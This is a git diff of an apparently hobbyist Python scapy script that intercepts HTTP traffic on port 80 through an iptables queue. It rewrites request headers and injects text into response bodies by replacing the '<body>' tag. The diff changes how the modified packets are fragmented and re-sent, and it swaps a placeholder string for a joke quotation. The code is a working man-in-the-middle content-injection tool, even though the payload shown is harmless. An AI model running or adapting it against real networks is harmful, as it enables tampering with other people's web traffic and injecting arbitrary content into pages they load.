@@ -46,6 +46,8 @@ def reset_iptables():
 	subprocess.call(["iptables", "--flush"])
 
 def intercept_packets(packet):
+	pkt = scapy.raw(packet)
+	print(pkt)
 	''' captures packet and processes it '''
 	try:
 		target_host = "tachibanalaboratories"
@@ -54,34 +56,44 @@ def intercept_packets(packet):
 
 		scapy_packet = scapy.IP(packet.get_payload())
 
-		if (scapy_packet.haslayer(http.HTTPRequest)):
+		if (scapy_packet.haslayer(scapy.TCP) and scapy_packet.haslayer(http.HTTPRequest)):
 		   # print(scapy_packet.show())
 			if scapy_packet[scapy.TCP].dport == 80:
-				#print("payload", scapy.raw(scapy_packet[IP].payload))
+				#print("payload", scapy.raw(scapy_packet[scapy.IP].payload))
 				new_packet = set_http_request_header(scapy_packet)
-				packet.set_payload(str(new_packet))
+				packet_fragment_list = scapy.fragment(new_packet)
+				forward_packet(packet_fragment_list, packet)
+				#packet.set_payload(str(new_packet))
 				
 				#print("request encoding", new_packet[http.HTTPRequest].Accept_Encoding)
 
-		elif (scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(http.HTTPResponse)):
+		elif (scapy_packet.haslayer(scapy.TCP) and scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(http.HTTPResponse)):
 			#print("response original length", scapy_packet[http.HTTPResponse].Content_Length)
 			load = scapy_packet[scapy.Raw].load
 			#print(type(scapy_packet))
 			if (scapy_packet[scapy.TCP].sport == 80):
 				new_packet = set_response_headers_and_load(scapy_packet, load, payload)
-				packet.set_payload(str(new_packet))
+				packet_fragment_list = scapy.fragment(new_packet)
+				forward_packet(packet_fragment_list, packet)
+				#packet.set_payload(str(new_packet))
 				#new_packet[scapy.IP].show()
 				#print("response modified length", new_packet[http.HTTPResponse].Content_Length)
 				#print("pwn")
+		else:
+			packet.accept()
 	except:
 		PrintException()
 	
-	packet.accept()
+	#packet.accept()
 
-def forward_packet(*args):
-	for packet in args:
-		packet.accept()
-
+def forward_packet(fragment_list, packet):
+	for index, packet_fragment in enumerate(fragment_list):
+		print("fragment", index, "###########################################################################################")
+		packet_fragment.show()
+		packet.set_payload(str(packet_fragment))
+		scapy.send(packet_fragment)
+	packet.drop()
+		#packet.send()
 '''
 #### REQUIRED FOR SOME VERSIONS OF SCAPY ####
 def get_raw_response_content_length(load):
@@ -111,34 +123,6 @@ def set_raw_response_content_length(load, payload):
 def gzip_load(load):
 	return zlib.compress(load)
 
-def fragment_packet(packet, req_or_res, *args):
-	fragmented_packets = fragment(packet, req_or_res, *args)
-	return fragmented_packets
-
-## stolen from https://github.com/secdev/scapy/blob/652b77bf12499451b47609b89abc663aa0f69c55/scapy/layers/inet.py#L891
-## this is a modified version
-
-def fragment(pkt, req_or_res, *args): #args are load, payload
-    """Fragment a big IP datagram"""
-    fragsize = 1480
-    fragsize = (fragsize + 7) // 8 * 8
-    lst = []
-    for p in pkt:
-        s = scapy.raw(p[IP].payload)
-        nb = (len(s) + fragsize - 1) // fragsize
-        for i in range(nb):
-            q = p.copy()
-            #del(q[IP].payload)
-            del(q[IP].chksum)
-            del(q[IP].len)
-            if i != nb - 1:
-                q[IP].flags |= 1
-            q[IP].frag += i * fragsize // 8          # <---- CHANGE THIS
-            r = conf.raw_layer(load=s[i * fragsize:(i + 1) * fragsize])
-            r.overload_fields = p[IP].payload.overload_fields.copy()
-            q.add_payload(r)
-            lst.append(q)
-    return lst
 
 def set_response_header_value_content_length(packet, payload):
 	try:
@@ -161,11 +145,17 @@ def set_response_headers_and_load(packet, load, payload):
 		#inject payload into raw layer
 		#print("Initial load", load)
 		#print("payload", payload)
-		payload = "<body>Hello world" # just a small string before I fix the issue with fragmentation
-
+		payload = "<body>The feeding ramp is polished to a mirror sheen. The slide's been\
+reinforced. And the interlock with the frame is tightened for added precision.\
+The sight system is original, too. The thumb safety is extended to make it\
+easier on the finger. A long-type trigger with non-slip grooves. A ring\
+hammer... The base of the trigger guard's been filed down for a higher grip.\
+And not only that, nearly every part of this gun has been expertly crafted and\
+customized. Where'd you get something like this?" # just a small string before I fix the issue with fragmentation
+		#payload = "<body> peepee poopoopeepee poopoopeepee poopoopeepee poopoopeepee poopoopeepee poopoopeepee poopoo"
 		new_load = load.replace("<body>", payload)
-		print(type(load))
-		print("Final load", new_load)
+		#print(type(load))
+		#print("Final load", new_load)
 		packet[scapy.Raw].load = new_load
 		#print ("Raw load", packet[scapy.Raw].load)
 		del packet[scapy.IP].len
